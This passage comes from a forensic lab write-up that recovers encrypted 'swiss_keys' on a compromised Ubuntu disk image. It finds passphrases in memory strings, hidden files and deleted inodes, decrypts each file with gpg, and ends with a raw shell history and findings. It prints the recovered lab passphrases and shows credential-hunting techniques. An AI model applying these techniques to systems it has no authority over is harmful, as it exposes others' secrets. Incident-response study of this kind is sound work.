-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
&gt; ~/swiss_keys/swisskey2
c0250780 t sysrq_key_table_key2index
dict_key2hash_string
key2
        [-O|--sort [+|-]key1[,[+|-]key2[,...]]]
        [-O|--sort [+|-]key1[,[+|-]key2[,...]]]
        [-O|--sort [+|-]key1[,[+|-]key2[,...]]]
        [-O|--sort [+|-]key1[,[+|-]key2[,...]]]
        [-O|--sort [+|-]key1[,[+|-]key2[,...]]]
        [-O|--sort [+|-]key1[,[+|-]key2[,...]]]
acerhk_key2name
'8  1  26  /home/rich/swiss_keys/swisskey2
-'  1  26  /home/rich/swiss_keys/swisskey2
&gt; /home/rich/swiss_keys/swisskey2
acerhk_key2name
swisskey2.swp
key2 41jade6tree29p
key2 41jade6tree29~~~
</pre>
</div>

<p>
The password is in the memory.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 161: </span>Commands</label><pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">cd</span> ~/
cp /images/sda1/home/rich/swiss_keys/swisskey2.gpg .
<span style="color: #DCDCCC; font-weight: bold;">echo</span> <span style="color: #CC9393;">"41jade6tree29"</span> | gpg --passphrase-fd 0 --no-tty -d swisskey2.gpg
rm swisskey2.gpg
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 162: </span>Results</label><pre class="src src-text">everybody_dance_now_hey_now
</pre>
</div>
</div>
</div>

<div id="outline-container-org3956596" class="outline-4">
<h4 id="org3956596"><span class="section-number-4">5.2.29</span> Key3</h4>
<div class="outline-text-4" id="text-5-2-29">
<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 163: </span>Commands</label><pre class="src src-sh">sudo strings /dev/loop2 | grep <span style="color: #CC9393;">"key 3"</span>
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 164: </span>Results</label><pre class="src src-text">        t_k3    &lt;F3&gt;            function key 3          *&lt;F3&gt;*  *t_k3* *'t_k3'*
                &lt;S-F3&gt;          shifted function key 3          *&lt;S-F3&gt;*
t_f3    t_k3    &lt;F3&gt;            function key 3                  *t_f3*
t_sf3           &lt;S-F3&gt;          shifted function key 3          *t_sf3*
key 3 29azalea8flower00
</pre>
</div>

<p>
Decrypt the message:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 165: </span>Commands</label><pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">cd</span> ~/
cp /images/sda1/home/rich/swiss_keys/swisskey3.gpg .
<span style="color: #DCDCCC; font-weight: bold;">echo</span> <span style="color: #CC9393;">"29azalea8flower00"</span> | gpg --passphrase-fd 0 --no-tty -d swisskey3.gpg
rm swisskey3.gpg
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 166: </span>Results</label><pre class="src src-text">what_would_you_do_if_sang_out_of_tune
</pre>
</div>
</div>
</div>

<div id="outline-container-org9f4adb8" class="outline-4">
<h4 id="org9f4adb8"><span class="section-number-4">5.2.30</span> Key4</h4>
<div class="outline-text-4" id="text-5-2-30">
<p>
Find the password file
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo find /images/sda1/home/ -type f -name <span style="color: #CC9393;">"key4"</span>
</pre>
</div>

<p>
Extract the key
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo awk -F<span style="color: #CC9393;">" "</span> <span style="color: #CC9393;">'{print $2}'</span> /images/sda1/home/rich/.extrtmtc/key4
</pre>
</div>

<p>
Password length
</p>

<div class="org-src-container">
<pre class="src src-emacs-lisp">(length <span style="color: #CC9393;">"11hibiscus2hibiscus23"</span>)
</pre>
</div>

<p>
Decrypt the file
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">cd</span> ~/
cp /images/sda1/home/rich/swiss_keys/swisskey4.gpg .
<span style="color: #DCDCCC; font-weight: bold;">echo</span> $(<span style="color: #CC9393;">awk</span> -F<span style="color: #CC9393;">" "</span> <span style="color: #CC9393;">'{print $2}'</span> /images/sda1/home/rich/.extrtmtc/key4 ) | gpg --passphrase-fd 0 --no-tty -d swisskey4.gpg
rm swisskey4.gpg
</pre>
</div>
</div>
</div>

<div id="outline-container-orgb1eb80f" class="outline-4">
<h4 id="orgb1eb80f"><span class="section-number-4">5.2.31</span> Key5</h4>
<div class="outline-text-4" id="text-5-2-31">
<p>
Find the password file
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo grep -rn /images/sda1/home -e <span style="color: #CC9393;">"^5 [A-Za-z0-9]*$"</span> 2&gt; /dev/null
</pre>
</div>

<p>
Extract the password
</p>

<div class="org-src-container">
<pre class="src src-sh">awk -F<span style="color: #CC9393;">" "</span> <span style="color: #CC9393;">'{print $2}'</span>cat $(<span style="color: #CC9393;">sudo</span> grep -rn /images/sda1/home -e <span style="color: #CC9393;">"^5 [A-Za-z0-9]*$"</span> 2&gt; /dev/null | awk -F<span style="color: #CC9393;">":"</span> <span style="color: #CC9393;">'{print $1}'</span>)
</pre>
</div>

<p>
Password length
</p>

<div class="org-src-container">
<pre class="src src-emacs-lisp">(length <span style="color: #CC9393;">"19rose42blossom35"</span>)
</pre>
</div>

<p>
Decrypt the file
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">cd</span> ~/
cp /images/sda1/home/rich/swiss_keys/swisskey5.gpg .
<span style="color: #DCDCCC; font-weight: bold;">echo</span> $(<span style="color: #CC9393;">awk</span> -F<span style="color: #CC9393;">" "</span> <span style="color: #CC9393;">'{print $2}'</span>cat $(<span style="color: #CC9393;">sudo</span> grep -rn /images/sda1/home -e <span style="color: #CC9393;">"^5 [A-Za-z0-9]*$"</span> 2&gt; /dev/null | awk -F<span style="color: #CC9393;">":"</span> <span style="color: #CC9393;">'{print $1}'</span>)) | gpg --passphrase-fd 0 --no-tty -d swisskey5.gpg
rm swisskey5.gpg
</pre>
</div>
</div>
</div>

<div id="outline-container-orgd7268aa" class="outline-4">
<h4 id="orgd7268aa"><span class="section-number-4">5.2.32</span> Key{6,7,8}</h4>
<div class="outline-text-4" id="text-5-2-32">
<p>
This need to be done from a real shell
</p>

<div class="org-src-container">
<pre class="src src-text">lnuitsac@workbench:~$ sudo e2undel -d /dev/loop0 -s /images/recovered -a -t
e2undel 0.82
Trying to recover files on /dev/loop0, saving them on /images/recovered

/dev/loop0 opened for read-only access
/dev/loop0 was not cleanly unmounted.
Do you want wo continue (y/n)? y
731752 inodes (706253 free)
1461883 blocks of 1024 bytes (875926 free)
last mounted on Sat Sep 15 11:03:39 2007

/dev/loop0 is mounted. Do you want to continue (y/n)? y

reading log file: opening log file: No such file or directory
no entries for /dev/loop0 in log file
searching for deleted inodes on /dev/loop0:
|==================================================|
731752 inodes scanned, 2846 deleted files found

   user name | 1 &lt;12 h | 2 &lt;48 h | 3  &lt;7 d | 4 &lt;30 d | 5  &lt;1 y | 6 older
-------------+---------+---------+---------+---------+---------+--------
        root |       3 |       0 |     237 |    2601 |       0 |       0
        1001 |       0 |       0 |       5 |       0 |       0 |       0
Select user name from table or press enter to exit: 1001
Select time interval (1 to 6) or press enter to exit: 3

  inode     size  deleted at        name
-----------------------------------------------------------
 368000       21  Sep  9 18:58 2007 * ASCII text
 368001       19  Sep  9 18:58 2007 * ASCII text
 368002       18  Sep  9 18:58 2007 * ASCII text
 368003      963  Sep  9 18:58 2007 * ASCII text
 703144    12288  Sep  9 22:40 2007 * application/core
Select an inode listed above or press enter to go back: 368000
21 bytes written to /images/recovered/inode-368000-ASCII_text
Select an inode listed above or press enter to go back: 368001
19 bytes written to /images/recovered/inode-368001-ASCII_text
Select an inode listed above or press enter to go back: 368002
18 bytes written to /images/recovered/inode-368002-ASCII_text
Select an inode listed above or press enter to go back: 368003
963 bytes written to /images/recovered/inode-368003-ASCII_text
Select an inode listed above or press enter to go back: 703144
12288 bytes written to /images/recovered/inode-703144-application_core
Select an inode listed above or press enter to go back:

   user name | 1 &lt;12 h | 2 &lt;48 h | 3  &lt;7 d | 4 &lt;30 d | 5  &lt;1 y | 6 older
-------------+---------+---------+---------+---------+---------+--------
        root |       3 |       0 |     237 |    2601 |       0 |       0
        1001 |       0 |       0 |       5 |       0 |       0 |       0
Select user name from table or press enter to exit:
lnuitsac@workbench:~$ grep -rn /images/recovered/ -e "^5 [A-Za-z0-9]*$" 2&gt; /dev/null
lnuitsac@workbench:~$ grep -rn /images/recovered/ -e "^[0-9] [A-Za-z0-9]*$" 2&gt; /dev/null
/images/recovered/inode-368001-ASCII_text:1:8 26daisy99daisy99
/images/recovered/inode-368002-ASCII_text:1:6 13tulip34root28
/images/recovered/inode-368000-ASCII_text:1:7 17jonquil23scent14
</pre>
</div>

<p>
Key 6
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">cd</span> ~/
cp /images/sda1/home/rich/swiss_keys/swisskey6.gpg .
<span style="color: #DCDCCC; font-weight: bold;">echo</span> <span style="color: #CC9393;">"13tulip34root28"</span> | gpg --passphrase-fd 0 --no-tty -d swisskey6.gpg
rm swisskey6.gpg
</pre>
</div>

<p>
Key 7
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">cd</span> ~/
cp /images/sda1/home/rich/swiss_keys/swisskey7.gpg .
<span style="color: #DCDCCC; font-weight: bold;">echo</span> <span style="color: #CC9393;">"17jonquil23scent14"</span> | gpg --passphrase-fd 0 --no-tty -d swisskey7.gpg
rm swisskey7.gpg
</pre>
</div>

<p>
Key 8
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">cd</span> ~/
cp /images/sda1/home/rich/swiss_keys/swisskey8.gpg .
<span style="color: #DCDCCC; font-weight: bold;">echo</span> <span style="color: #CC9393;">"26daisy99daisy99"</span> | gpg --passphrase-fd 0 --no-tty -d swisskey8.gpg
rm swisskey8.gpg
</pre>
</div>
</div>
</div>

<div id="outline-container-org9e2de20" class="outline-4">
<h4 id="org9e2de20"><span class="section-number-4">5.2.33</span> Look for keys</h4>
<div class="outline-text-4" id="text-5-2-33">
<div class="org-src-container">
<pre class="src src-sh">ls -l /images/sda1
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">sudo grep -rn /images/sda1/lib/ -e <span style="color: #CC9393;">"^[1-8] [A-Za-z0-9]*$"</span> 2&gt; /dev/null
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">sudo find /images/sda1/usr -type f -print -exec file {} + | grep <span style="color: #CC9393;">"ASCII text"</span>
<span style="color: #5F7F5F;">#</span><span style="color: #7F9F7F;">sudo grep -rn /images/sda1/etc -e "^8 [A-Za-z0-9]*$" 2&gt; /dev/null</span>
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">sudo cat /images/sda1/boot/abi-2.6.15-26-server
</pre>
</div>

<p>
How long are the keys?
</p>

<div class="org-src-container">
<pre class="src src-emacs-lisp">(length <span style="color: #CC9393;">"11hibiscus2hibiscus23"</span>)
<span style="color: #5F7F5F;">;;</span><span style="color: #7F9F7F;">(length "23philo7dendron88")</span>
</pre>
</div>
</div>
</div>

<div id="outline-container-orga8edc6a" class="outline-4">
<h4 id="orga8edc6a"><span class="section-number-4">5.2.34</span> History</h4>
<div class="outline-text-4" id="text-5-2-34">
<p>
In some cases Emacs babel execution is not suffiecient. In those
cases we need to attach to a &ldquo;real&rdquo; shell. Below is the pure
history. Some cleanup have been made to highlight the commands
that could be important.
</p>
</div>

<ol class="org-ol">
<li><a id="orgba2bf9d"></a><span class="timestamp-wrapper"><span class="timestamp">&lt;2007-09-14 Fri&gt;</span></span><br />
<div class="outline-text-5" id="text-5-2-34-1">
<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 167: </span>Commands history</label><pre class="src src-text">137  sudo grep -rnw /images/sda1/home/ -e "*207.92.30.41*" 2&gt; /dev/null
138  sudo grep -rnw /images/sda1/home/ -e "*207.92.30.41*"
139  sudo grep -rnw /images/sda1/home/ -e "*207.92.30.41*" 2&gt; /dev/null
140  sudo grep -rnw /images/sda1/home/ -e "207.92.30.41" 2&gt; /dev/null
141  sudo grep -rnw /images/sda1/etc/ -e "207.92.30.41" 2&gt; /dev/null
142  lastlog -h
143  man lastlog
144  file /images/sda1/var/log/lastlog
145  cat /images/sda1/var/log/lastlog
146  chroot /images/sda1/
147  sudo chroot /images/sda1/
148  join
149  ls
150  join
151  swapout
152  swapip
153  swapin
154  swapin
155  join
156  join
157  cat /images/sda1/var/log/faillog
158  cat /images/sda1/var/log/kern.log
200  cat /images/sda1/var/log/dmesg
201  cat /images/sda1/var/log/user.log
202  cat /images/sda1/var/log/uucp.log
203  cat /images/sda1/var/log/news/news.err
204  cat /images/sda1/var/log/ksymoops/20070910.log
205  cat /images/sda1/var/log/daemon.log
206  cat /images/sda1/var/log/debug
207  lastb
208  sudo lastb
209  emacs25 doc.org
210  cd /images/recovered
211  ls
212  ls -la
213  emacs25 doc.org
214  cd -
215  emacs25 doc.org
216  sudo e2undel -d /dev/loop0 -s /images/recovered -a -t
217  ls
218  cd what/
219  ls
220  cd ..
221  ls
222  cd /images/recovered/
223  ls
224  cat *
225  cd
226  emacs25 doc.org
227  cat /images/sda1/
228  emacs25 doc.org
229  sudo mount /dev/loop0 /images/sda1 -t ext2 -o ro
230  cd /images/sda1/var/lo
231  cd /images/sda1/var/log/
232  ls
233  cat auth.log
234  sudo cat auth.log
235  sudo cat auth.log |grep mike
236  cd
237  emacs doc.org
238  emacs25 doc.org
239  cat /images/sda1/etc/motd
240  emacs25 doc.org
241  emacs25 doc.org
242  swapin
243  join
244  join
245  swapout
246  swapin
247  chroot /images/sda1/
248  sudo chroot /images/sda1/
249  cat /images/sda1/var/log/btmp
250  cat /images/sda1/
251  cd /images/sda1/
252  ls
253  cd var/lo
254  cd var/log/
255  ls
256  ls -la
257  cd
258  pwd
259  chroot /images/sda1/
260  sudo chroot /images/sda1/
261  cat /images/sda1/var/log/btmp
262  cat /images/sda1/home/jake/.cshrc
263  join
264  swapip
265  swapin
266  ls
267  emacs25 doc.org
268  emacs25 doc.org
269  emacs25 doc.org
270  emacs25 doc.org
271  emacs25 doc.org
272  emacs25 doc.org
273  ps aux | grep grep
274  kill 5228
275  sudo kill 5228
276  sudo kill 5592
277  ps aux | grep grep
278  sudo strace -s 99 -ffp 5602
279  ps aux | grep grep
280  sudo strace -s 99 -ffp 6510
281  ps aux | grep grep
282  sudo strace -s 99 -ffp 6521
283  ps aux | grep grep
284  sudo strace -s 99 -ffp 6531
285  ps aux | grep grep
286  sudo strace -s 99 -ffp 6537
287  sudo strace -s 99 -ffp 6538
288  sudo strace -s 99 -ffp 6539
289  ps aux | grep grep
290  sudo strace -s 99 -ffp 6541
291  ps aux | grep grep
292  sudo strace -s 99 -ffp 6549
293  ps aux | grep grep
294  sudo strace -s 99 -ffp 6556
295  ps aux | grep grep
296  sudo strace -s 99 -ffp 6560
297  lsp
298  ps aux | grep grep
299  sudo strace -s 99 -ffp 8701
300  ls
301  cd
302  emacs doc.org
303  emacs25 doc.org
304  fg
305  whereis expwait
306  cat /usr/testbed/bin/expwait
307  cat /usr/testbed/bin/expwait | less
308  swapin
309  swapout
310  swapin
311  sudo chroot /images/sda1/
312  cat /images/sda1/var/log/btmp
313  cat /images/sda1/var/log/auth.log
314  sudo e2undel -d /dev/loop0 -s /images/recovered -a -t
315  cat sudo e2undel -d /dev/loop0 -s /images/recovered -a -t
316  cat /images/recovered/inode-16460-ASCII_text
317  cat /images/recovered/inode-16460-ASCII_text | less
318  cat /images/sda1/var/log/messages
319  cat `find /images/sda1/tmp/ -type f -print -exec file {} + | grep ASCII | awk -F":" '{print $1}'`
320  gpg /images/sda1/tmp/extortomatic-23421/key1
321  gpg /images/sda1/home/rich/swiss_keys/swisskey1.gpg
322  man gpg
323  ls
324  gpg -d swisskey1.gpg
325  pg -d swisskey1.gpg &lt; awk -F" " '{print $2}'cat `find /images/sda1/tmp/ -type f -print -exec file {} + | grep ASCII | awk -F":" '{print $1}'`
326  gpg -d swisskey1.gpg &lt; awk -F" " '{print $2}'cat `find /images/sda1/tmp/ -type f -print -exec file {} + | grep ASCII | awk -F":" '{print $1}'`
327  awk -F" " '{print $2}'cat `find /images/sda1/tmp/ -type f -print -exec file {} + | grep ASCII | awk -F":" '{print $1}'`
328  gpg -d swisskey1.gpg
329  man gpg
330  man gpg
331  echo $(awk -F" " '{print $2}'cat $(find /images/sda1/tmp/ -type f -print -exec file {} + | grep ASCII | awk -F":" '{print $1}')) | gpg -d swisskey1.gpg
332  echo $(awk -F" " '{print $2}'cat $(find /images/sda1/tmp/ -type f -print -exec file {} + | grep ASCII | awk -F":" '{print $1}')) | gpg --passphrase-fd 0 -d swisskey1.gpg
333  udo grep -rn /images/sda1/lib/ -e "^[1-8] [A-Za-z0-9]*$"
334  sudo grep -rn /images/sda1/lib/ -e "^[1-8] [A-Za-z0-9]*$"
335  sudo grep -rn /images/sda1/ -e "^[1-8] [A-Za-z0-9]*$" 2&gt; /dev/null
336  sudo grep -rn /images/sda1/ --exclude=/images/sda1/var/run/klogd/kmsg -e "^[1-8] [A-Za-z0-9]*$" 2&gt; /dev/null
337  sudo grep -rn /images/sda1/ --exclude=kmsg -e "^[1-8] [A-Za-z0-9]*$" 2&gt; /dev/null
338  sudo grep -rn /images/sda1/ --exclude={kmsg,console} -e "^[1-8] [A-Za-z0-9]*$" 2&gt; /dev/null
339  sudo grep -rn /images/sda1/ --exclude={kmsg,console} --exclude-dir=/images/sda1/lib/udev/ -e "^[1-8] [A-Za-z0-9]*$" 2&gt; /dev/null
340  sudo grep -rn /images/sda1/ --exclude={kmsg,console} --exclude-dir=udev -e "^[1-8] [A-Za-z0-9]*$" 2&gt; /dev/null
341  sudo grep -rn /images/sda1/ --exclude={kmsg,console,random,zero,null} --exclude-dir=udev -e "^[1-8] [A-Za-z0-9]*$" 2&gt; /dev/null
342  sudo grep -rn /images/sda1/ --exclude={kmsg,console,random,zero,null,tty} --exclude-dir=udev -e "^[1-8] [A-Za-z0-9]*$" 2&gt; /dev/null
343  sudo grep -rn /images/sda1/ --exclude={kmsg,console,random,zero,null,tty} --exclude-dir=udev -e "^[2-8] [A-Za-z0-9]*$" 2&gt; /dev/null
344  sudo grep -rn /images/sda1/ --exclude={kmsg,console,random,zero,null,tty} --exclude-dir={udev,dev} -e "^[2-8] [A-Za-z0-9]*$" 2&gt; /dev/null
345  strings /dev/loopp1
346  strings /dev/loop1
347  sudo strings /dev/loop1
348  sudo strings /dev/loop1 | grep "*key("
349  sudo strings /dev/loop1 | grep "*key*"
350  sudo strings /dev/loop1 | grep "key2\|key3\|key6\|key7\|key8"
351  sudo strings /dev/loop1 | grep "key3\|key6\|key7\|key8"
352  sudo strings /dev/loop1 | grep "key2\|key3\|key6\|key7\|key8"
353  sudo e2undel -d /dev/loop0 -s /images/recovered -a -t
354  grep -rn /images/recovered/ -e "^5 [A-Za-z0-9]*$" 2&gt; /dev/null
355  grep -rn /images/recovered/ -e "^[0-9] [A-Za-z0-9]*$" 2&gt; /dev/null
356  sudo e2undel -d /dev/loop0 -s /images/recovered -a -t
357  grep -rn /images/recovered/ -e "^[0-9] [A-Za-z0-9]*$" 2&gt; /dev/null
358  sudo e2undel -d /dev/loop0 -s /images/recovered -a -t
359  grep -rn /images/recovered/ -e "^[0-9] [A-Za-z0-9]*$" 2&gt; /dev/null
360  sudo e2undel -d /dev/loop0 -s /images/recovered -a -t
361  grep -rn /images/recovered/ -e "^[0-9] [A-Za-z0-9]*$" 2&gt; /dev/null
362  sudo e2undel -d /dev/loop0 -s /images/recovered -a -t
363  cd /images/recovered/
364  ls
365  ls -la
366  cat inode-368003-ASCII_text
367  cat * | less
368  hexdump /images/sda1/home/chef/recipes/bread
369  hexdump /images/sda1/home/chef/recipes/bread -C
370  cat * | less
371  ls -la
372  hexdump inode-703144-application_core -C
373  ls
374  ls -la
375  hexdump inode-703144-application_core -C | grep key3
376  hexdump * -C | grep key3
377  cat * | grep key3
378  hexdump * -C | grep -n 5 key3
379  hexdump * -C | grep -n5 key3
380  cat * | less
381  string /dev/loop1 | grep key3
382  strings /dev/loop1 | grep key3
383  sudo strings /dev/loop1 | grep key3
384  sudo strings /dev/loop2 | grep key3
385  sudo e2undel -d /dev/loop0 -s /images/recovered -a -t
386  sudo e2undel -d /dev/loop0 -s /images/recovered -a -t
387  sudo e2undel -d /dev/loop0 -s /images/recovered -a -t
388  history
389  grep -rn /images/recovered/ -e "^[0-9] [A-Za-z0-9]*$" 2&gt; /dev/null
390  ls
391  ls -la
392  cat * | grep key3
393  find /images/sda1/home/ -type f -name .bash_profile -exec cat {} \;
394  find /images/sda1/home/ -type f -name .bash_profile -exec cat {} +| grep key3
395  sudo find /images/sda1/home/ -type f -name .bash_profile -exec cat {} +| grep key3
396  sudo find /images/sda1/home/ -type f -name .bash_logout -exec cat {} +| grep key3
397  sudo find /images/sda1 -type f -name "*key1*"
398  sudo find /images/sda1 -type f -name "*key3*"
399  strings /dev/loop0 | grep key3
400  sudo strings /dev/loop0 | grep key3
401  grep -r -m 1 "^" /images/sda1 | grep "^Binary file"
402  sudo grep -r -m 1 "^" /images/sda1 | grep "^Binary file"
403  ./images/sda1/usr/bin/dumpkeys
404  file /images/sda1/usr/bin/dumpkeys
405  hexdump /images/sda1/usr/bin/dumpkeys -C | grep key
406  join
407  history
408  history &gt;&gt; history.txt
</pre>
</div>
</div>
</li>
</ol>
</div>
</div>

<div id="outline-container-orgebe1ce7" class="outline-3">
<h3 id="orgebe1ce7"><span class="section-number-3">5.3</span> Report findings</h3>
<div class="outline-text-3" id="text-5-3">
<p>
I could recover all of the encrypted access keys. But i could not
find out how the cracker got access to the system.
</p>
</div>
</div>

<div id="outline-container-orga8f3177" class="outline-3">
<h3 id="orga8f3177"><span class="section-number-3">5.4</span> Time estimation</h3>
<div class="outline-text-3" id="text-5-4">
<p>
12 hours
</p>
</div>
</div>

<div id="outline-container-org8639153" class="outline-3">
<h3 id="org8639153"><span class="section-number-3">5.5</span> Before going to production</h3>
<div class="outline-text-3" id="text-5-5">
<p>
The Ubuntu system is outdated, update it to a newer Long Term
Service (LTS) system. Update all of the user passwords.
</p>
</div>
</div>
</div>
</div>
<div id="postamble" class="status">
<p class="date">Date: <span class="timestamp-wrapper"><span class="timestamp">&lt;2017-02-18 Sat&gt;</span></span> <span class="timestamp-wrapper"><span class="timestamp">&lt;2007-09-15 Sat&gt;</span></span> <span class="timestamp-wrapper"><span class="timestamp">&lt;2007-09-15 Sat&gt;</span></span> <span class="timestamp-wrapper"><span class="timestamp">&lt;2007-09-15 Sat&gt;</span></span></p>
<p class="author">Author: John Herrlin John Herrlin John Herrlin John Herrlin</p>
<p class="date">Created: 2018-05-29 Tue 09:05</p>
<p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
</div>
</body>
</html>
